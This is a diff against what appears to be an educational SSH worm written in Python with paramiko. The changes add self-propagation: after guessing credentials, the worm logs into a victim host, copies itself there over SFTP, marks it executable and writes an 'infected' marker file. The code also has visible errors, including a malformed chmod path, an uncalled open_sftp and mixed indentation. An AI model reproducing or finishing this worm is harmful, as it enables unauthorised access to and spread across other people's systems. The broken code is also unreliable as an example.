@@ -39,7 +39,9 @@ def markInfected():
 	# this is to create a file called infected.txt
 	# in directory /tmp/
     print("Mark file infected")
-    file(INFECTED_MARKER_FILE, "a+")
+    worm = open(INFECTED_MARKER_FILE, 'w')
+    worm.write("Your system has been infected")
+    worm.close()
 
 ###############################################################
 # Spread to the other system and execute
@@ -59,7 +61,9 @@ def spreadAndExecute(sshClient):
 	# The code which goes into this function
 	# is very similar to that code.	
     
-        ssh = paramiko.SSHClient()
+        sftpClient = sshClient.open_sftp()
+	sftpClient.put("/tmp/worm.py", "/tmp/worm.py")
+	sshClient.exec_command("chmod a+x /tmp/worm/py")
     
    # ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
     
@@ -111,6 +115,7 @@ def tryCredentials(host, userName, password, sshClient):
              sshClient.connect(host, userName, password)
              print("Opened a connectin to the victim's system!")
              sftpClient = sshClient.open_sftp
+	     return 0
         except paramiko.SSHException:
              print("Wrong credentials :(")
              return 1
@@ -153,7 +158,7 @@ def attackSystem(host):
 		# return a tuple containing an
 		# instance of the SSH connection
 		# to the remote system. 
-		if(0 == tryCredentials(host, username, password)):
+		if(0 == tryCredentials(host, username, password, ssh)):
                      print("Successfully compromised the system, it returned 0")
                      return(ssh, username, password)
 			
